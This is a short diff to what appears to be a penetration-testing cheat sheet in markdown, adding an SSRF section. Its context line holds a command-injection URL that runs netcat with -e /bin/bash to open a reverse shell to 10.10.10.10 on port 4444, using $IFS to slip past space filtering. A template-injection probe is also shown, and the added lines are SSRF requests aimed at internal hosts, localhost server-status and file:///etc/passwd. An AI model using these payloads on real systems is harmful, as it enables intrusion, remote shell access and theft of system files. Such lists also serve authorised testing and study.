@@ -198,6 +198,16 @@ http://10.10.10.10/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.10.10'$IFS'4444
 {{dump(app)}}
 ```
 
+### SSRF
+
+```
+GET /?url=http://corp.local
+
+GET /?url=http://localhost/server-status
+
+GET /?url=file:///etc/passwd 
+```
+
 ## Privilege Escalation
 
 ## Reverse Engineering
